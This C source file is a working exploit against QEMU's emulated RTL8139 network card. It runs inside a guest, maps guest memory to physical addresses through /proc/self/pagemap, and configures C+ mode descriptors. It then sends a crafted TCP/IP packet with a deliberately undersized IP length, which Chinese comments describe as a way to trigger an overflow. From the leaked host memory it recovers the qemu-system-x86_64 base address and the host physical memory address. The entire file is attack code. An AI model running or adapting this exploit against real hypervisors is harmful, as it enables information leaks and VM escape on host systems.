/*
* @Author: resery
* @Date:   2020-10-15 08:02:58
* @Last Modified by:   resery
* @Last Modified time: 2020-10-15 10:45:34
*/
/*
* @Author: resery
* @Date:   2020-10-14 15:41:43
* @Last Modified by:   resery
* @Last Modified time: 2020-10-14 20:59:10
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdint.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

#define RTL8139_BUFFER_SIZE 1514
uint32_t pmio_port = 0xc000;

enum RTL8139_registers {
    MAC0 = 0,        /* Ethernet hardware address. */
    MAR0 = 8,        /* Multicast filter. */
    TxStatus0 = 0x10,/* Transmit status (Four 32bit registers). C mode only */
                     /* Dump Tally Conter control register(64bit). C+ mode only */
    TxAddr0 = 0x20,  /* Tx descriptors (also four 32bit). */
    RxBuf = 0x30,
    ChipCmd = 0x37,
    RxBufPtr = 0x38,
    RxBufAddr = 0x3A,
    IntrMask = 0x3C,
    IntrStatus = 0x3E,
    TxConfig = 0x40,
    RxConfig = 0x44,
    Timer = 0x48,        /* A general-purpose counter. */
    RxMissed = 0x4C,    /* 24 bits valid, write clears. */
    Cfg9346 = 0x50,
    Config0 = 0x51,
    Config1 = 0x52,
    FlashReg = 0x54,
    MediaStatus = 0x58,
    Config3 = 0x59,
    Config4 = 0x5A,        /* absent on RTL-8139A */
    HltClk = 0x5B,
    MultiIntr = 0x5C,
    PCIRevisionID = 0x5E,
    TxSummary = 0x60, /* TSAD register. Transmit Status of All Descriptors*/
    BasicModeCtrl = 0x62,
    BasicModeStatus = 0x64,
    NWayAdvert = 0x66,
    NWayLPAR = 0x68,
    NWayExpansion = 0x6A,
    /* Undocumented registers, but required for proper operation. */
    FIFOTMS = 0x70,        /* FIFO Control and test. */
    CSCR = 0x74,        /* Chip Status and Configuration Register. */
    PARA78 = 0x78,
    PARA7c = 0x7c,        /* Magic transceiver parameter register. */
    Config5 = 0xD8,        /* absent on RTL-8139A */
    /* C+ mode */
    TxPoll        = 0xD9,    /* Tell chip to check Tx descriptors for work */
    RxMaxSize    = 0xDA, /* Max size of an Rx packet (8169 only) */
    CpCmd        = 0xE0, /* C+ Command register (C+ mode only) */
    IntrMitigate    = 0xE2,    /* rx/tx interrupt mitigation control */
    RxRingAddrLO    = 0xE4, /* 64-bit start addr of Rx ring */
    RxRingAddrHI    = 0xE8, /* 64-bit start addr of Rx ring */
    TxThresh    = 0xEC, /* Early Tx threshold */
};

/* Bits in TxConfig. */
enum tx_config_bits {

    /* Interframe Gap Time. Only TxIFG96 doesn't violate IEEE 802.3 */
    TxIFGShift = 24,
    TxIFG84 = (0 << TxIFGShift),    /* 8.4us / 840ns (10 / 100Mbps) */
    TxIFG88 = (1 << TxIFGShift),    /* 8.8us / 880ns (10 / 100Mbps) */
    TxIFG92 = (2 << TxIFGShift),    /* 9.2us / 920ns (10 / 100Mbps) */
    TxIFG96 = (3 << TxIFGShift),    /* 9.6us / 960ns (10 / 100Mbps) */

    TxLoopBack = (1 << 18) | (1 << 17), /* enable loopback test mode */
    TxCRC = (1 << 16),    /* DISABLE appending CRC to end of Tx packets */
    TxClearAbt = (1 << 0),    /* Clear abort (WO) */
    TxDMAShift = 8,        /* DMA burst value (0-7) is shifted this many bits */
    TxRetryShift = 4,    /* TXRR value (0-15) is shifted this many bits */

    TxVersionMask = 0x7C800000, /* mask out version bits 30-26, 23 */
};

/* Bits in RxConfig. */
enum rx_mode_bits {
    AcceptErr = 0x20,
    AcceptRunt = 0x10,
    AcceptBroadcast = 0x08,
    AcceptMulticast = 0x04,
    AcceptMyPhys = 0x02,
    AcceptAllPhys = 0x01,
};

enum ChipCmdBits {
    CmdReset = 0x10,
    CmdRxEnb = 0x08,
    CmdTxEnb = 0x04,
    RxBufEmpty = 0x01,
};

/* C+ mode */
enum CplusCmdBits {
    CPlusRxVLAN   = 0x0040, /* enable receive VLAN detagging */
    CPlusRxChkSum = 0x0020, /* enable receive checksum offloading */
    CPlusRxEnb    = 0x0002,
    CPlusTxEnb    = 0x0001,
};

struct rtl8139_desc {
	uint32_t dw0;
	uint32_t dw1;
	uint32_t buf_lo;
	uint32_t buf_hi;
};

struct rtl8139_ring {
	struct rtl8139_desc *desc;
	void                *buffer;
};

#define RTL8139_BUFFER_SIZE 1514

/* w0 ownership flag */
#define CP_TX_OWN (1<<31)
/* w0 end of ring flag */
#define CP_TX_EOR (1<<30)
/* first segment of received packet flag */
#define CP_TX_FS (1<<29)
/* last segment of received packet flag */
#define CP_TX_LS (1<<28)
/* large send packet flag */
#define CP_TX_LGSEN (1<<27)
/* large send MSS mask, bits 16...25 */
#define CP_TC_LGSEN_MSS_MASK ((1 << 12) - 1)

/* IP checksum offload flag */
#define CP_TX_IPCS (1<<18)
/* UDP checksum offload flag */
#define CP_TX_UDPCS (1<<17)
/* TCP checksum offload flag */
#define CP_TX_TCPCS (1<<16)

/* w0 bits 0...15 : buffer size */
#define CP_TX_BUFFER_SIZE (1<<16)
#define CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)
/* w1 add tag flag */
#define CP_TX_TAGC (1<<17)
/* w1 bits 0...15 : VLAN tag (big endian) */
#define CP_TX_VLAN_TAG_MASK ((1<<16) - 1)
/* w2 low  32bit of Rx buffer ptr */
/* w3 high 32bit of Rx buffer ptr */

/* set after transmission */
/* FIFO underrun flag */
#define CP_TX_STATUS_UNF (1<<25)
/* transmit error summary flag, valid if set any of three below */
#define CP_TX_STATUS_TES (1<<23)
/* out-of-window collision flag */
#define CP_TX_STATUS_OWC (1<<22)
/* link failure flag */
#define CP_TX_STATUS_LNKF (1<<21)
/* excessive collisions flag */
#define CP_TX_STATUS_EXC (1<<20)

/* w0 ownership flag */
#define CP_RX_OWN (1<<31)
/* w0 end of ring flag */
#define CP_RX_EOR (1<<30)
/* w0 bits 0...12 : buffer size */
#define CP_RX_BUFFER_SIZE_MASK ((1<<13) - 1)
/* w1 tag available flag */
#define CP_RX_TAVA (1<<16)
/* w1 bits 0...15 : VLAN tag */
#define CP_RX_VLAN_TAG_MASK ((1<<16) - 1)
/* w2 low  32bit of Rx buffer ptr */
/* w3 high 32bit of Rx buffer ptr */

uint8_t rtl8139_packet[] = {
    //目标mac地址
    0x52, 0x54, 0x00, 0x12, 0x34, 0x57, 
    //源mac地址
    0x52, 0x54, 0x00, 0x12, 0x34, 0x57, 
    //代表IPV4
    0x08, 0x00, 

    //报头长度
    (0x04 << 4) | 0x05,
    //TOS
    0x00,
    //这里由于我们需要设置长度为19,从而实现溢出
    0x00, 0x13,
    //Identification
    0xde, 0xad,
    //Flags & Fragment Offset(必须为64的整数倍,所以直接设置为64)
    0x40, 0x00,
    //TTL通常为32,64,128这里直接设置为64
    0x40,           
    //Protocol为6代表TCP
    0x06,
    // Header checksum
    0xde, 0xad,
    //源IP:127.0.0.1
    0x7f, 0x00, 0x00, 0x01,
    //目的IP:127.0.0.1
    0x7f, 0x00, 0x00, 0x01,
    
    // IP Packet Payload 数据, 即 TCP 数据包
    //源端口
    0xde, 0xad,
    //目的端口
    0xbe, 0xef,
    //Sequence Number
    0x00, 0x00, 0x00, 0x00,
    //Acknowledgement Number
    0x00, 0x00, 0x00, 0x00,
    //报头长度,其中Header Length只占4位,后面的4位加上下面ACK中的2位都是保留位,保留位必须为0
    0x50,
    //从第3位开始是Control Flags,其中第4位代表ACK
    0x10,
    //Window Size
    0xde, 0xad,
    //TCP checksum
    0xde, 0xad,
    //Urgent Pointer
    0x00, 0x00
};

size_t virtuak_addr_to_physical_addr(void *addr){
	uint64_t data;

	int fd = open("/proc/self/pagemap",O_RDONLY);
	if(!fd){
		perror("open pagemap");
        return 0;
	}

	size_t pagesize = getpagesize();
	size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);

	if(lseek(fd,offset,SEEK_SET) < 0){
		puts("lseek");
		close(fd);
		return 0;
	}

	if(read(fd,&data,8) != 8){
		puts("read");
		close(fd);
		return 0;
	}

	if(!(data & (((uint64_t)1 << 63)))){
		puts("page");
		close(fd);
		return 0;
	}

	size_t pageframenum = data & ((1ull << 55) - 1);
	size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;

	close(fd);

	return phyaddr;
}

void pmio_writeb(uint32_t data,uint32_t addr){
	outb(data,pmio_port+addr);
}

void pmio_writew(uint32_t data,uint32_t addr){
	outw(data,pmio_port+addr);
}

void pmio_writel(uint32_t data,uint32_t addr){
	outl(data,pmio_port+addr);
}

uint32_t pmio_readb(uint32_t addr){
	return (uint32_t)inb(addr);
}

uint32_t pmio_readw(uint32_t addr){
	return (uint32_t)inw(addr);
}

uint32_t pmio_readl(uint32_t addr){
	return (uint32_t)inl(addr);
}

void rtl8139_desc_config_rx(struct rtl8139_ring* ring, struct rtl8139_desc* desc, size_t nb){
	size_t buffer_size = RTL8139_BUFFER_SIZE + 4;
    for (size_t i = 0; i < nb; ++i) {
    	memset(&desc[i], 0, sizeof(desc[i]));
    	ring[i].desc = &desc[i];
        
        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);
        memset(ring[i].buffer, 0, buffer_size);

        ring[i].desc->dw0 |= CP_RX_OWN;
        ring[i].desc->dw0 |= buffer_size;
        ring[i].desc->buf_lo = (uint32_t)virtuak_addr_to_physical_addr(ring[i].buffer);
    }
    pmio_writel((uint32_t)virtuak_addr_to_physical_addr(desc), RxRingAddrLO);
    pmio_writel(0, RxRingAddrHI);
}

void rtl8139_desc_config_tx(struct rtl8139_desc* desc, void* buffer){
	memset(desc,0,sizeof(struct rtl8139_desc));
	desc->dw0 |= CP_TX_LS | CP_TX_OWN | CP_TX_EOR | CP_TX_IPCS | CP_TX_UDPCS | CP_TX_TCPCS | CP_TX_LGSEN;
	desc->dw0 |= RTL8139_BUFFER_SIZE;
	desc->buf_lo = (uint32_t)virtuak_addr_to_physical_addr(buffer);
    pmio_writel((uint32_t)virtuak_addr_to_physical_addr(desc), TxAddr0);
    pmio_writel(0,TxAddr0 + 4);
}

void rtl8139_card_config(){
	pmio_writel(TxLoopBack, TxConfig);
    pmio_writel(AcceptMyPhys, RxConfig);
    pmio_writew(CPlusRxEnb | CPlusTxEnb, CpCmd);
    pmio_writeb(CmdRxEnb | CmdTxEnb, ChipCmd);
}

void rtl8139_packet_send(void* buffer, void* packet, size_t len) {
    if (len <= RTL8139_BUFFER_SIZE) 
    {
        memcpy(buffer, packet, len);
        pmio_writeb(1<<6,TxPoll);
    }
}

void leak_data(uint8_t* ptr, size_t size) 
{
    for (size_t i = 0, j = 0; i < size; ++i, ++j) 
    {
        if (i % 16 == 0) 
        {
            j = 0;
            printf("\n0x%08x: ", (uint32_t)(ptr + i));
        }
        printf("%02x ", ptr[i]);
        if (j == 7) 
        {
            printf("- ");
        }
    }
    printf("\n");
}

uint64_t leak_module_base_addr(struct rtl8139_ring* ring, size_t ring_count) 
{
    const uint64_t property_get_bool_offset = 0x33db93;
    const uint64_t mask = 0x00000FFF;
    
    for (size_t i = 0; i < ring_count; ++i) 
    {
        //加56为了对齐
        uint8_t* ptr = (uint8_t*)ring[i].buffer + 56;
        uint8_t* end = (uint8_t*)ring[i].buffer + RTL8139_BUFFER_SIZE / 4 * 4;
        while (ptr < end - 8) 
        {
            uint64_t value = *(uint64_t*)ptr;
            if ((value & mask) == (property_get_bool_offset & mask)) 
        	{
        	    printf("property_get_str: 0x%" PRIx64 "\n", value);
        	    return value - property_get_bool_offset;
        	}
        	ptr += 4;
        }
    }
    return -1;
}

uint64_t leak_physical_memory_addr(struct rtl8139_ring* ring, size_t ring_count) 
{
    const uint64_t mask = 0xffff000000ull;
    static unsigned short array[0x10000];
    size_t index = 0;
    memset(array, 0, sizeof(array));
    
    for (size_t i = 0; i < ring_count; ++i) 
    {
        uint8_t* ptr = (uint8_t*)ring[i].buffer + 56;
        uint8_t* end = (uint8_t*)ring[i].buffer + RTL8139_BUFFER_SIZE / 4 * 4;
        while (ptr < end - 8) 
        {
            uint64_t value = *(uint64_t*)ptr;
            if (((value >> 40) & 0xff) == 0x7f) 
            {
                value = (value & mask) >> 24;
                array[value]++;
                if (array[value] > array[index]) 
                {
                    index = value;
                }
            }
            ptr += 4;
        }
    }
    
    uint64_t memory_size = 0x40000000;
    return (((uint64_t)index | 0x7f0000) << 24) - memory_size;
}

int main(){
    size_t rtl8139_rx_nb = 44;
    struct rtl8139_ring *rtl8139_rx_ring;
    struct rtl8139_desc *rtl8139_rx_desc, *rtl8139_tx_desc;

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
    }

    rtl8139_rx_ring = (struct rtl8139_ring *)aligned_alloc(
        PAGE_SIZE, rtl8139_rx_nb * sizeof(struct rtl8139_ring));

    rtl8139_rx_desc = (struct rtl8139_desc *)aligned_alloc(
        PAGE_SIZE, rtl8139_rx_nb * sizeof(struct rtl8139_desc));

    rtl8139_tx_desc = (struct rtl8139_desc *)aligned_alloc(
        PAGE_SIZE, sizeof(struct rtl8139_desc));

    void* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);

    iopl(3);

    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);
    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);
    rtl8139_card_config();
    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, sizeof(rtl8139_packet));

    sleep(2);

    for (size_t i = 0; i < rtl8139_rx_nb; ++i) 
    {
        leak_data((uint8_t*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
    }

    uint64_t module_addr = leak_module_base_addr(rtl8139_rx_ring, rtl8139_rx_nb);
    printf("qemu-system-x86_64: 0x%" PRIx64 "\n", module_addr);
    uint64_t physical_memory_addr = leak_physical_memory_addr(rtl8139_rx_ring, rtl8139_rx_nb);
    printf("physical memory address: 0x%" PRIx64 "\n", physical_memory_addr);
    
    return 0;
}